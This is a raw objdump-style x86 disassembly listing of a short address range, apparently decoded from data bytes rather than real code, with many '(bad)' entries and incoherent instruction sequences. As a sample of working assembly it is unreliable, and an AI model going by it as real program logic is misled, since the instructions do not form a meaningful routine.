  40df5d:	add    BYTE PTR [edi+0xc483],bl
  40df63:	mov    gs:0x21cc86cc,al
  40df69:	(bad)  
  40df6a:	dec    DWORD PTR [edx]
  40df6c:	sti    
  40df6d:	int3   
  40df6e:	in     al,0xff
  40df70:	stc    
  40df71:	cmp    edi,0x60
  40df74:	or     bh,bh
  40df76:	std    
  40df77:	call   FWORD PTR [edx]
  40df79:	inc    DWORD PTR [eax]
  40df7b:	in     al,0x0
  40df7d:	push   DWORD PTR [esi-0x7d]
  40df80:	jge    0x40df05
  40df82:	int3   
  40df83:	inc    eax
  40df84:	ss add al,bl
  40df87:	add    BYTE PTR [ebx],dh
  40df89:	(bad)  
  40df8a:	call   FWORD PTR [eax]
  40df8c:	popa   
  40df8d:	add    al,ah
  40df8f:	add    BYTE PTR [eax+eax*1],dh
  40df92:	add    BYTE PTR [ebx-0x6],bl
  40df95:	add    BYTE PTR [ebp-0x1],ch
  40df98:	jecxz  0x40df99
  40df9a:	and    DWORD PTR [ecx],0xffffffde
  40df9d:	add    BYTE PTR [edx+0xffc000],dl
  40dfa3:	popa   
  40dfa4:	imul   eax,DWORD PTR [eax],0xff6000be
  40dfaa:	push   ebx
  40dfac:	in     eax,0x0
  40dfae:	out    dx,eax
  40dfaf:	add    BYTE PTR [eax],dl
  40dfb1:	add    ah,cl
  40dfb3:	div    BYTE PTR [edi]
  40dfb5:	jmp    esi
  40dfb7:	push   esi
  40dfb9:	add    bh,bh
  40dfbb:	xor    eax,DWORD PTR ds:0xdbff4c00
  40dfc1:	inc    DWORD PTR [eax]
  40dfc3:	shr    BYTE PTR [edi+0x3fffd1ff],1
  40dfc9:	add    bh,bh
  40dfcb:	cdq    
  40dfcc:	and    al,0xff
  40dfce:	stos   DWORD PTR es:[edi],eax
  40dfcf:	add    BYTE PTR [ecx+0xa4effff],ch
  40dfd5:	int3   
  40dfd6:	dec    ebp
  40dfd7:	add    BYTE PTR [edx],bl
  40dfd9:	add    BYTE PTR [ecx-0x97cc2b4],cl
  40dfdf:	jmp    DWORD PTR [esi-0x1]
  40dfe2:	push   DWORD PTR [edi]
  40dfe4:	push   esp
  40dfe5:	add    BYTE PTR [edi-0x1],bh
  40dfe8:	ret    0xff83
  40dfeb:	stos   BYTE PTR es:[edi],al
  40dfec:	sbb    al,BYTE PTR [eax]
  40dfee:	gs mov ebp,ecx
  40dff1:	dec    esp
  40dff3:	daa    
  40dff4:	enter  0xe983,0x0
  40dff8:	mov    dh,0xff
  40dffa:	jmp    FWORD PTR [edi-0xa]
  40dffd:	inc    DWORD PTR [edx-0x5901]
  40e003:	les    ecx,FWORD PTR [ecx]
  40e005:	jmp    DWORD PTR [ebx]
  40e007:	(bad)  
  40e008:	dec    DWORD PTR [ecx-0x6c4601]
  40e00e:	popf   
  40e00f:	push   edi
  40e011:	(bad)  
  40e012:	call   esi
  40e014:	adc    al,0xcc
  40e016:	or     al,BYTE PTR [ebx-0x9ff004a]
  40e01c:	xor    al,BYTE PTR [ebx-0x33ceffb9]
  40e022:	(bad)  
  40e023:	stc    
  40e024:	(bad)  
  40e025:	inc    esp
  40e027:	sub    DWORD PTR [edi+edi*8+0x0],0xffffffe3
  40e02c:	fld    QWORD PTR [ebx-0x4d002d]
  40e032:	(bad)  
  40e033:	fld    TBYTE PTR [ebx]
  40e035:	push   DWORD PTR [ebx]
  40e037:	mov    DWORD PTR [edx],eax
  40e039:	(bad)  
  40e03a:	push   DWORD PTR ds:0xb3ffc0
  40e040:	xor    edi,edi
  40e042:	call   edi
  40e044:	inc    ebp
  40e045:	add    BYTE PTR [ebx-0x7d],ah
  40e048:	sub    bh,bh
  40e04a:	add    BYTE PTR [eax],bh
  40e04c:	mov    esp,0xec0008ff
  40e051:	(bad)  
  40e052:	(bad)  
  40e053:	in     eax,dx
  40e054:	or     eax,0xa9ff0b00
  40e059:	mov    DWORD PTR [ebx-0x300054e9],eax
  40e05f:	add    BYTE PTR [ebp-0x2dab0001],dh
  40e065:	jmp    DWORD PTR [edi-0x77]
  40e068:	enter  0xccff,0xbc
  40e06c:	add    cl,BYTE PTR [ecx-0x7c3b7623]
  40e072:	add    BYTE PTR [esi-0x33780044],cl
  40e078:	inc    edi
  40e079:	mov    DWORD PTR [eax],eax
  40e07b:	cwde   
  40e07c:	imul   edi,edi,0xe
  40e07f:	mov    DWORD PTR [ebx],ecx
  40e081:	(bad)  
  40e082:	(bad)  
  40e083:	jmp    0x40e0bc
  40e085:	int3   
  40e086:	xor    BYTE PTR [eax],al
  40e088:	add    al,BYTE PTR [eax]
  40e08a:	add    cl,bl
  40e08c:	ins    BYTE PTR es:[edi],dx
  40e08d:	mov    DWORD PTR [ecx],edi
  40e08f:	add    BYTE PTR [edx],dl
  40e091:	(bad)  
  40e092:	call   ecx
  40e094:	(bad)  
  40e096:	cli    
  40e097:	call   FWORD PTR [eax+eax*1-0x2f1501]
  40e09e:	cmp    edi,0x77cc8909
  40e0a4:	mov    ebx,0x53ff04ff
  40e0a9:	mov    edi,edi
  40e0ab:	pop    esi
  40e0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0ad:	inc    DWORD PTR [ecx+ecx*4+0x7800cc0f]
  40e0b4:	or     BYTE PTR [ebx-0x4300f4],al
  40e0ba:	push   DWORD PTR [ebp-0x7d]
  40e0bd:	int3   
  40e0be:	sub    eax,0xff830a00
  40e0c3:	dec    ecx
  40e0c4:	leave  
  40e0c5:	add    BYTE PTR ds:0xffffef89,cl
  40e0cb:	sbb    ebx,DWORD PTR ds:0x220029cc
  40e0d1:	int3   
  40e0d2:	push   DWORD PTR [ecx]
  40e0d4:	rol    BYTE PTR [eax],cl
  40e0d6:	jo     0x40e0a4
  40e0d8:	inc    DWORD PTR [bx+si]
  40e0db:	fistp  DWORD PTR [ebx+0x0]
  40e0de:	inc    esi
  40e0df:	add    BYTE PTR [edx+0x0],ch
  40e0e2:	add    BYTE PTR [eax-0x143370],ah
  40e0e8:	ins    DWORD PTR es:[edi],dx
  40e0e9:	int3   
  40e0ea:	jmp    DWORD PTR [edi]
  40e0ec:	out    0xff,al
  40e0ee:	fmul   DWORD PTR [ecx-0x6400006a]
  40e0f4:	iret   
  40e0f5:	(bad)  
  40e0f6:	std    
  40e0f7:	inc    DWORD PTR [eax]
  40e0f9:	add    bh,bh
  40e0fb:	push   ebx
  40e0fc:	cmc    
  40e0fd:	sbb    DWORD PTR [eax-0xd101],0xffffffe2
  40e104:	test   eax,0x24ff9789
  40e109:	(bad)  
  40e10a:	call   DWORD PTR [ebp-0x7c2a3332]
  40e110:	(bad)  
  40e111:	dec    esp
  40e113:	imul   eax,DWORD PTR [esi+0x0],0x31004c
  40e11a:	int3   
  40e11b:	xchg   edi,eax
  40e11c:	add    DWORD PTR [eax],0xff13ff28
  40e122:	push   DWORD PTR [eax]
  40e124:	vmovntps YMMWORD PTR [ecx+0x53ffff6b],ymm1
  40e12c:	cmp    eax,0x8effb8ff
  40e131:	cmp    edi,0x8
  40e134:	pop    es
  40e135:	(bad)  
  40e136:	jg     0x40e138
  40e138:	jae    0x40e139
  40e13a:	add    ah,dh
  40e13c:	dec    BYTE PTR [ecx-0x81ff6c]
  40e142:	inc    DWORD PTR [eax]
  40e144:	lods   eax,DWORD PTR ds:[esi]
  40e145:	adc    ebp,0xffffff83
  40e148:	and    eax,0xcbf0ff00
  40e14d:	add    BYTE PTR [edi+edi*8-0x6cff7c63],dl
  40e154:	pushf  
  40e155:	add    BYTE PTR [edi-0x1],bh
  40e158:	inc    ebp
  40e159:	(bad)  
  40e15a:	push   esp
  40e15c:	push   esp
  40e15d:	(bad)  
  40e15e:	fild   WORD PTR [eax]
  40e160:	sbb    bh,bh
  40e162:	dec    DWORD PTR ds:0xff5fcc00
  40e168:	pop    esp
  40e169:	add    bh,bh
  40e16b:	sti    
  40e16c:	pop    edx
  40e16d:	jmp    FWORD PTR [ecx-0xfff37d]
  40e173:	xchg   DWORD PTR [edi+0x1b001cff],ebx
  40e179:	(bad)  
  40e17a:	push   DWORD PTR [edx+0x60]
  40e17d:	int3   
  40e17e:	jmp    0x40e17f
  40e180:	out    dx,eax
  40e181:	mov    esp,ecx
  40e183:	cs mov ah,cl
  40e186:	jb     0x40e188
  40e188:	mov    al,BYTE PTR [ebx-0x7612057d]
  40e18e:	test   eax,0xcc00d000
  40e193:	sbb    eax,0x6d00df
  40e198:	mov    bh,0x83
  40e19a:	add    BYTE PTR [eax],dh
  40e19c:	cmp    edi,0xfa001f
  40e1a2:	mov    DWORD PTR [ebx+edx*4-0x107c8577],eax
  40e1a9:	mov    DWORD PTR [eax],eax
  40e1ab:	retf   
  40e1ac:	iret   
  40e1ad:	add    BYTE PTR [ecx],bl
  40e1af:	int3   
  40e1b0:	inc    edx
  40e1b1:	cmp    edi,0x3b
  40e1b4:	xchg   BYTE PTR [eax],al
  40e1b6:	leave  
  40e1b7:	cmp    DWORD PTR [ebp+0x35a0ff83],0xffffff89
  40e1be:	icebp  
  40e1bf:	(bad)  
  40e1c0:	fiadd  DWORD PTR [ebx+0x8994ff]
  40e1c6:	pop    ds
  40e1c7:	(bad)  
  40e1c8:	in     al,dx
  40e1c9:	inc    DWORD PTR [eax]
  40e1cb:	mov    ebx,0xff48831d
  40e1d0:	xchg   ebx,eax
  40e1d1:	mov    DWORD PTR [eax],eax
  40e1d3:	data16 xor al,0x89
  40e1d6:	in     al,0x0
  40e1d8:	call   0xc9fcae60
  40e1dd:	int3   
  40e1de:	fld    DWORD PTR [eax]
  40e1e0:	jbe    0x40e1e1
  40e1e2:	mov    DWORD PTR [edi],eax
  40e1e4:	jmp    0xffcc:0xd60041ff
  40e1eb:	pop    edx
  40e1ec:	xchg   edi,eax
  40e1ed:	add    bl,al
  40e1ef:	call   FWORD PTR [eax+0x1a9acc89]
  40e1f5:	int3   
  40e1f6:	push   0xffffffff
  40e1f8:	jmp    0x9ff:0xa2618983
  40e1ff:	jmp    DWORD PTR [esi-0x1]
  40e202:	push   DWORD PTR [edx-0x7ce400fd]
  40e208:	sar    bh,1
  40e20a:	jmp    DWORD PTR [edx+0x62]
  40e20d:	add    BYTE PTR [esi-0x1],dl
  40e210:	dec    ebx
  40e211:	add    bh,bh
  40e213:	out    0x8,al
  40e215:	(bad)  
  40e216:	in     al,dx
  40e217:	add    BYTE PTR [edx-0x1],dl
  40e21a:	adc    DWORD PTR [ecx+edx*8-0x1],0xffffff81
  40e21f:	inc    esi
  40e221:	int3   
  40e222:	mov    ebp,esp
  40e224:	inc    eax
  40e225:	add    BYTE PTR [eax],ah
  40e227:	add    BYTE PTR [edi-0x7d],bh
  40e22a:	call   DWORD PTR [edi]
  40e22c:	jae    0x40e22e
  40e22e:	add    edi,edi
  40e230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e231:	mov    esp,ecx
  40e233:	pusha  
  40e234:	jle    0x40e235
  40e236:	push   edx
  40e237:	mov    DWORD PTR [eax-0x7d],ebp
  40e23a:	inc    DWORD PTR [ebx]
  40e23c:	ud0    esi,DWORD PTR [edx]
  40e23f:	xor    DWORD PTR [edx-0x34],0x0
  40e243:	leave  
  40e244:	(bad)  
  40e246:	data16 add BYTE PTR [edi-0x1],bl
  40e24a:	mov    esi,eax
  40e24c:	adc    DWORD PTR [ebx-0x7696332a],eax
  40e252:	jmp    esp
  40e254:	sbb    eax,0xbd0055cc
  40e259:	add    bh,bh
  40e25b:	pop    edi
  40e25c:	xchg   edi,eax
  40e25d:	add    bh,bl
  40e25f:	mov    DWORD PTR [eax],eax
  40e261:	(bad)  
  40e262:	push   DWORD PTR [eax]
  40e264:	out    0x0,eax
  40e266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e267:	jmp    FWORD PTR [ebp-0x64ec0100]
  40e26d:	(bad)  
  40e26e:	mov    esi,0xffff5600
  40e273:	xor    BYTE PTR [eax-0x56ffe134],al
  40e279:	(bad)  
  40e27a:	call   FWORD PTR [eax+eax*4-0x1]
  40e27e:	in     eax,dx
  40e27f:	mov    DWORD PTR [ebx],ebx
  40e281:	add    DWORD PTR [eax],0x4
  40e284:	mov    bl,0xff
  40e286:	jle    0x40e211
  40e288:	cli    
  40e289:	add    bh,bh
  40e28b:	js     0x40e26e
  40e28d:	mov    DWORD PTR [edi-0x3300987d],esp
  40e293:	es jp  0x40e296
  40e296:	outs   dx,BYTE PTR ds:[esi]
  40e297:	int3   
  40e298:	adc    eax,0x595cff00
  40e29d:	jmp    FWORD PTR [esi]
  40e29f:	jmp    DWORD PTR [ebx]
  40e2a1:	(bad)  
  40e2a2:	inc    ebp
  40e2a4:	js     0x40e2a5
  40e2a6:	lock jmp FWORD PTR [edi+0x7008ffff]
  40e2ad:	mov    DWORD PTR [edi+edi*8-0x5f],ecx
  40e2b1:	(bad)  
  40e2b2:	(bad)  
  40e2b3:	jmp    DWORD PTR [edi+0x0]
  40e2b6:	inc    edx
  40e2b7:	add    DWORD PTR [ecx-0x5aff7c7d],0xffffff83
  40e2be:	sbb    BYTE PTR [eax],al
  40e2c0:	iret   
  40e2c1:	add    DWORD PTR [eax],0x60
  40e2c4:	fiadd  DWORD PTR [eax]
  40e2c6:	jl     0x40e294
  40e2c8:	add    BYTE PTR fs:[eax],al
  40e2cb:	xchg   DWORD PTR [ebx+eax*4],esi
  40e2ce:	out    0xcc,eax
  40e2d0:	pop    ecx
  40e2d1:	add    BYTE PTR [ecx+0x7f00316d],cl
  40e2d7:	call   FWORD PTR [ebp+0xd3c00ff]
  40e2dd:	(bad)  
  40e2de:	call   0x41adaf
  40e2e3:	inc    edx
  40e2e4:	clc    
  40e2e5:	dec    DWORD PTR [ecx-0x1]
  40e2e8:	inc    esp
  40e2e9:	add    BYTE PTR [eax],al
  40e2eb:	lods   eax,DWORD PTR ds:[esi]
  40e2ec:	repnz add BYTE PTR [eax+eax*1-0x1400009e],ah
  40e2f4:	push   ss
  40e2f5:	add    BYTE PTR [edi+edi*8-0x7e],ah
  40e2f9:	add    DWORD PTR [eax],0x38
  40e2fc:	call   0x8300:0xabff52ff
  40e303:	fcomi  st,st(1)
  40e305:	call   ebx
  40e307:	add    BYTE PTR [esi-0x1],bl
  40e30a:	sub    DWORD PTR [edx],0xfffffff2
  40e30d:	add    BYTE PTR [ecx],ah
  40e30f:	add    BYTE PTR [eax+eax*1+0x0],cl
  40e313:	sar    DWORD PTR [eax-0x4e008001],1
  40e319:	(bad)  
  40e31a:	dec    DWORD PTR [edx-0x35]
  40e31d:	jmp    FWORD PTR [ebx-0x1]
  40e320:	dec    edx
  40e321:	cmp    edi,0xffffffca
  40e324:	pushf  
  40e325:	cmp    DWORD PTR [ecx-0x1],0x1b
  40e329:	(bad)  
  40e32a:	(bad)  
  40e32b:	jns    0x40e325
  40e32d:	or     DWORD PTR [edi+0x0],0x3e
  40e331:	add    bh,bh
  40e333:	add    ebx,DWORD PTR [eax-0x34]
  40e336:	cmp    al,0x83
  40e338:	dec    eax
  40e339:	or     esp,0xffffffb1
  40e33c:	pushf  
  40e33d:	int3   
  40e33e:	jo     0x40e340
  40e340:	sbb    bh,bh
  40e342:	mov    edi,edx
  40e344:	or     DWORD PTR gs:0xcc00ec00,0x11
  40e34c:	cdq    
  40e34d:	dec    DWORD PTR [edx-0x7c6101]
  40e353:	adc    DWORD PTR [edi],0xffeecc
  40e359:	mov    DWORD PTR [eax],eax
  40e35b:	inc    ebx
  40e35c:	sbb    edi,edi
  40e35e:	lea    eax,[eax]
  40e360:	sahf   
  40e361:	dec    esp
  40e363:	xor    dl,BYTE PTR [ecx-0x53ff0b00]
  40e369:	add    BYTE PTR [ebx-0x18ff9259],al
  40e36f:	(bad)  
  40e370:	mov    ebp,0xb2b70000
  40e375:	add    BYTE PTR [edi],cl
  40e377:	add    BYTE PTR [ecx],bh
  40e379:	inc    DWORD PTR [eax]
  40e37b:	xchg   esi,eax
  40e37c:	sbb    BYTE PTR [ecx-0x7cc4fff2],cl
  40e382:	add    BYTE PTR [ecx-0x80],ch
  40e385:	dec    DWORD PTR [ebx+0x76ff]
  40e38b:	pop    ebx
  40e38c:	fmul   QWORD PTR [ecx+0xf58384]
  40e392:	int3   
  40e393:	inc    ecx
  40e394:	aaa    
  40e395:	add    BYTE PTR [eax-0x34],bl
  40e398:	mov    BYTE PTR [eax],al
  40e39a:	add    BYTE PTR [edx+0x4d],al
  40e39d:	call   FWORD PTR [edi]
  40e39f:	add    bh,cl
  40e3a1:	add    BYTE PTR [ebx+0x2d00c227],al
  40e3a7:	dec    DWORD PTR [edi+edi*8]
  40e3aa:	int3   
  40e3ab:	push   esp
  40e3ac:	mov    al,0x0
  40e3ae:	(bad)  
  40e3b0:	icebp  
  40e3b1:	(bad)  
  40e3b2:	call   DWORD PTR [eax+0x5c]
  40e3b5:	add    BYTE PTR [esi-0x76ffaf00],al
  40e3bb:	jle    0x40e411
  40e3bd:	(bad)  
  40e3be:	fdiv   st(7),st
  40e3c0:	dec    ebx
  40e3c1:	add    bh,bh
  40e3c3:	std    
  40e3c4:	js     0x40e3c6
  40e3c6:	jns    0x40e3c7
  40e3c8:	in     eax,0x0
  40e3ca:	add    BYTE PTR [edx+0x92ff32],cl
  40e3d0:	inc    BYTE PTR [eax]
  40e3d2:	inc    DWORD PTR [ebx-0x59]
  40e3d5:	sbb    DWORD PTR ds:0xff1500,0xffffffdf
  40e3dc:	ds int3 
  40e3de:	and    al,0xff
  40e3e0:	cdq    
  40e3e1:	inc    DWORD PTR [eax]
  40e3e3:	shl    ebx,0xff
  40e3e6:	popf   
  40e3e7:	call   DWORD PTR [edx]
  40e3e9:	(bad)  
  40e3ea:	dec    DWORD PTR [edx+edx*1-0x34]
  40e3ee:	imul   edi,edi,0xd7ccffd0
  40e3f4:	stc    
  40e3f5:	mov    DWORD PTR [edi-0x77],ebp
  40e3f8:	inc    esi
  40e3f9:	int3   
  40e3fa:	push   ecx
  40e3fc:	add    bh,bh
  40e3fe:	mov    DWORD PTR [ebx+0x7e83ff86],0x73ff87
  40e408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e409:	inc    DWORD PTR [eax]
  40e40b:	add    ebx,DWORD PTR [edi-0x7d]
  40e40e:	cmp    al,0x83
  40e410:	add    edi,edi
  40e412:	call   FWORD PTR [edx-0xa17cb7]
  40e418:	mov    ch,0xff
  40e41a:	add    BYTE PTR ds:0x39831e,cl
  40e420:	jnp    0x40e3a5
  40e422:	mov    DWORD PTR [ebx],esp
  40e424:	jecxz  0x40e426
  40e426:	dec    edi
  40e427:	jmp    FWORD PTR [eax-0x77]
  40e42a:	add    BYTE PTR [edi+0x6b],bl
  40e42d:	jmp    FWORD PTR [edx-0x7cfff77d]
  40e433:	xor    DWORD PTR [edi],esi
  40e435:	call   FWORD PTR [edi+edi*8+0x7100ffee]
  40e43c:	xlat   BYTE PTR ds:[ebx]
  40e43d:	add    BYTE PTR [ebx-0x1],bl
  40e440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e441:	(bad)  
  40e442:	push   DWORD PTR ds:0xff3bffb7
  40e448:	ret    
  40e449:	add    DWORD PTR [eax],0xffffffa9
  40e44c:	retf   0x27ff
  40e44f:	add    BYTE PTR [esi-0x6bd7ff01],ah
  40e455:	dec    DWORD PTR [edx]
  40e457:	add    BYTE PTR [eax-0x11b3ff7d],bh
  40e45d:	add    BYTE PTR [edx+0x89adff],al
  40e463:	je     0x40e473
  40e465:	add    BYTE PTR [eax+eax*1+0x72],ah
  40e469:	(bad)  
  40e46a:	(bad)  
  40e46b:	cmp    cl,al
  40e46d:	inc    DWORD PTR [eax]
  40e46f:	add    ch,bl
  40e471:	mov    DWORD PTR [eax],eax
  40e473:	lock jge 0x40e3ff
  40e476:	mov    ah,0xff
  40e478:	fwait
  40e479:	(bad)  
  40e47a:	(bad)  
  40e47b:	out    dx,eax
  40e47c:	jae    0x40e47d
  40e47e:	xchg   esp,eax
  40e47f:	jmp    FWORD PTR [ecx]
  40e481:	add    DWORD PTR [eax],0x71
  40e484:	lds    eax,FWORD PTR [eax]
  40e486:	(bad)  
  40e488:	mov    esp,cs
  40e48a:	dec    DWORD PTR [ecx+ebp*2-0x7d]
  40e48e:	mov    eax,0xffff3f83
  40e493:	cld    
  40e494:	in     eax,dx
  40e495:	add    BYTE PTR [ecx-0x7d],bh
  40e498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e499:	add    bh,bh
  40e49b:	ss int 0xff
  40e49e:	xor    al,0xff
  40e4a0:	sahf   
  40e4a1:	inc    DWORD PTR [eax]
  40e4a3:	mov    bl,0xb7
  40e4a5:	add    DWORD PTR [ebp+0x0],0x16
  40e4a9:	add    bh,bh
  40e4ab:	fwait
  40e4ac:	stos   BYTE PTR es:[edi],al
  40e4ad:	add    BYTE PTR [eax+0x0],dh
  40e4b0:	or     al,BYTE PTR [ebx-0x61fc77]
  40e4b6:	mov    bl,0x0
  40e4b8:	push   ebp
  40e4b9:	add    BYTE PTR [eax],al
  40e4bb:	in     eax,dx
  40e4bc:	adc    eax,0x3300f6ff
  40e4c1:	(bad)  
  40e4c2:	jmp    FWORD PTR [edi]
  40e4c4:	stos   DWORD PTR es:[edi],eax
  40e4c5:	add    ch,bh
  40e4c7:	dec    DWORD PTR [edi+0x347c0000]
  40e4cd:	call   FWORD PTR [ebp+0xcc8fff]
  40e4d3:	int3   
  40e4d4:	add    bh,bh
  40e4d6:	adc    eax,0xcc009800
  40e4db:	arpl   cx,sp
  40e4dd:	sub    DWORD PTR [edi+edi*8-0x26],0xffffffff
  40e4e2:	(bad)  
  40e4e3:	mov    ebp,0xffb9ff83
  40e4e8:	aas    
  40e4e9:	(bad)  
  40e4ea:	jmp    DWORD PTR [ecx-0x197695]
  40e4f0:	add    DWORD PTR [eax],eax
  40e4f2:	int3   
  40e4f3:	cdq    
  40e4f4:	cdq    
  40e4f5:	add    al,cl
  40e4f7:	add    ch,al
  40e4f9:	cmp    edi,0x12
  40e4fc:	(bad)  
  40e4fe:	fdivr  st,st(7)
  40e500:	call   0x49926904
  40e505:	mov    DWORD PTR [edi-0x1],edi
  40e508:	mov    dh,0xff
  40e50a:	add    dh,ah
  40e50c:	ud0    esi,DWORD PTR [ecx+0x0]
  40e510:	pop    ss
  40e511:	add    bh,bh
  40e513:	or     cl,al
  40e515:	add    ah,cl
  40e517:	add    BYTE PTR ds:0xcd88300,bh
  40e51d:	call   FWORD PTR [edi-0x1]
  40e520:	lock dec esp
  40e523:	pop    edx
  40e524:	fmul   QWORD PTR [ecx-0xf6ff26]
  40e52a:	call   FWORD PTR [ebp+0x36]
  40e52d:	call   DWORD PTR [edx-0x3300797d]
  40e533:	test   al,0xf8
  40e535:	call   DWORD PTR [ecx]
  40e537:	(bad)  
  40e538:	jg     0x40e53a
  40e53a:	push   DWORD PTR [ebx-0x3b]
  40e53d:	add    cl,bl
  40e53f:	push   DWORD PTR [edi+edi*8+0x4fabff]
  40e546:	leave  
  40e547:	mov    esi,ebp
  40e549:	add    BYTE PTR [eax],al
  40e54b:	mov    DWORD PTR [ecx-0x3affd201],edi
  40e551:	add    DWORD PTR [eax],0xffffffde
  40e554:	idiv   bh
  40e556:	add    BYTE PTR [bx+di],dh
  40e559:	inc    DWORD PTR [ebx-0x2f7c4241]
  40e55f:	jmp    FWORD PTR [ebp-0x1]
  40e562:	push   DWORD PTR [ecx]
  40e564:	cmp    al,BYTE PTR [eax]
  40e566:	ins    DWORD PTR es:[edi],dx
  40e567:	mov    DWORD PTR [ecx-0x77],ebp
  40e56a:	dec    DWORD PTR [eax]
  40e56c:	(bad)  
  40e56d:	dec    DWORD PTR [ebx+0x0]
  40e570:	pop    ebx
  40e571:	mov    edi,edi
  40e573:	xor    bh,BYTE PTR [esi+0x0]
  40e576:	call   WORD PTR [esp+ecx*8-0x1]
  40e57b:	fiadd  DWORD PTR [esi-0x1cffc400]
  40e581:	cmp    edi,0xffffffd9
  40e584:	xor    al,0xff
  40e586:	stc    
  40e587:	add    BYTE PTR [eax-0x34280001],ah
  40e58d:	add    BYTE PTR ds:0xffff6e00,dl
  40e593:	mov    ss,WORD PTR [eax+0x0]
  40e596:	cmc    
  40e597:	add    BYTE PTR [ecx+0x489c0089],al
  40e59d:	add    dh,bl
  40e59f:	jmp    ebx
  40e5a1:	(bad)  
  40e5a2:	call   FWORD PTR [edi+edi*2]
  40e5a5:	add    bh,al
  40e5a7:	(bad)  
  40e5a8:	mov    esi,0x3af1ffcc
  40e5ad:	int3   
  40e5ae:	push   0xff008f00
  40e5b3:	inc    edi
  40e5b4:	mov    eax,ds:0xdfff1e00
  40e5b9:	add    DWORD PTR [ebx+0x6effa5da],0xffffff83
  40e5c0:	mov    ecx,0x98f38383
  40e5c5:	add    BYTE PTR [ebx+eax*4+0x540000b4],ah
  40e5cc:	cmp    DWORD PTR [ebx-0x7cebff77],eax
  40e5d2:	call   DWORD PTR [ebp-0x79]
  40e5d5:	add    bl,dh
  40e5d7:	add    BYTE PTR [esi-0x2de63334],ch
  40e5dd:	add    BYTE PTR [esi-0x1d01],cl
  40e5e3:	jl     0x40e650
  40e5e5:	add    BYTE PTR [ecx-0xd634],dh
  40e5eb:	xor    ecx,ecx
  40e5ed:	add    BYTE PTR [edi-0x77],bh
  40e5f0:	mov    esi,0xdcb9ff00
  40e5f5:	jmp    FWORD PTR [ecx+ecx*4+0x75]
  40e5f9:	dec    esp
  40e5fb:	shr    DWORD PTR [edi+edi*8+0x2f],1
  40e5ff:	sub    DWORD PTR [ebx+0x7f90000],0xffffffff
  40e606:	test   al,0xff
  40e608:	pusha  
  40e609:	add    BYTE PTR [eax],al
  40e60b:	mov    ebx,0x1b83b1
  40e610:	scas   al,BYTE PTR es:[edi]
  40e611:	add    bh,bh
  40e613:	ficomp DWORD PTR [eax+eax*1+0xbfff3a]
  40e61a:	(bad)  
  40e61b:	stc    
  40e61c:	xchg   edi,eax
  40e61d:	add    BYTE PTR [esi],bh
  40e61f:	dec    ecx
  40e621:	int3   
  40e622:	jmp    FWORD PTR [esi]
  40e624:	pop    ebp
  40e625:	mov    DWORD PTR [ebx-0x768101],ebp
  40e62b:	shl    DWORD PTR [ebx-0x67003c01],1
  40e631:	add    bh,bh
  40e633:	outs   dx,DWORD PTR ds:[esi]
  40e634:	pop    es
  40e635:	add    ah,ah
  40e637:	int3   
  40e638:	add    BYTE PTR [eax],0x0
  40e63b:	in     al,dx
  40e63c:	out    0xff,eax
  40e63e:	sar    bh,cl
  40e640:	push   0x0
  40e642:	push   DWORD PTR [ecx-0x6]
  40e645:	(bad)  
  40e646:	fadd   QWORD PTR [ebx-0x7200003d]
  40e64c:	pop    esi
  40e64d:	int3   
  40e64e:	xor    eax,0xffff1a00
  40e653:	arpl   WORD PTR [ecx+0x3c006c83],dx
  40e659:	add    BYTE PTR [eax],al
  40e65b:	pop    ss
  40e65c:	push   ds
  40e65d:	mov    DWORD PTR [ecx-0x1],esi
  40e660:	or     DWORD PTR [eax],eax
  40e662:	dec    ebx
  40e664:	in     al,dx
  40e665:	jmp    DWORD PTR [ebx]
  40e667:	jmp    DWORD PTR [ebx-0x1]
  40e66a:	add    BYTE PTR [ebx],ch
  40e66c:	imul   eax,DWORD PTR [eax],0x4
  40e66f:	add    BYTE PTR [ecx-0x60ec7700],ch
  40e675:	(bad)  
  40e676:	js     0x40e601
  40e678:	iret   
  40e679:	(bad)  
  40e67a:	inc    edx
  40e67c:	push   cs
  40e67d:	jmp    DWORD PTR [eax-0x77]
  40e680:	pop    ss
  40e681:	mov    esp,ecx
  40e683:	dec    ebp
  40e684:	(bad)  
  40e685:	push   DWORD PTR [edx]
  40e687:	add    BYTE PTR [ebp+0x3b9b83ff],cl
  40e68d:	add    BYTE PTR [ecx-0xbb00],bh
  40e693:	aas    
  40e694:	icebp  
  40e695:	(bad)  
  40e696:	jg     0x40e697
  40e698:	dec    ah
  40e69a:	call   edi
  40e69c:	test   bh,bh
  40e69e:	stc    
  40e69f:	add    BYTE PTR [esi+0x6a1e0000],ah
  40e6a5:	mov    edx,ebx
  40e6a7:	call   FWORD PTR [esi-0x1]
  40e6aa:	int3   
  40e6ab:	xchg   esp,eax
  40e6ac:	add    al,BYTE PTR [ebx-0x766c0080]
  40e6b2:	or     DWORD PTR [edx+eax*1-0x1],0x7a
  40e6b7:	push   DWORD PTR [edx]
  40e6b9:	inc    DWORD PTR [eax]
  40e6bb:	jnp    0x40e687
  40e6bd:	int3   
  40e6be:	in     al,0x83
  40e6c0:	inc    esi
  40e6c1:	(bad)  
  40e6c2:	dec    DWORD PTR [esi+edi*2+0x7ff29ff]
  40e6c9:	cmp    edi,0x5d
  40e6cc:	call   FWORD PTR es:[ecx-0x7d]
  40e6d0:	mov    bh,bh
  40e6d2:	add    BYTE PTR [eax-0x8],al
  40e6d5:	mov    DWORD PTR [ecx+0xffd8ff],edi
  40e6db:	xor    BYTE PTR [edx-0x1],ch
  40e6de:	push   0xffffffff
  40e6e0:	int    0x0
  40e6e2:	add    BYTE PTR [ebp+0x4b],bh
  40e6e5:	mov    edx,ebx
  40e6e7:	add    ah,cl
  40e6e9:	int3   
  40e6ea:	int3   
  40e6eb:	int3   
  40e6ec:	int3   
  40e6ed:	int3   
  40e6ee:	int3   
  40e6ef:	int3   
  40e6f0:	add    bh,bh
  40e6f2:	cmp    BYTE PTR [ebp+0x3b56ff83],cl
  40e6f8:	mov    DWORD PTR [eax],eax
  40e6fa:	jmp    FWORD PTR [ebp-0x300e8ad]
  40e700:	inc    DWORD PTR [eax]
  40e702:	repz fcmove st,st(4)
  40e705:	int3   
  40e706:	rcl    edx,1
  40e708:	add    BYTE PTR [ecx+0x67314aff],cl
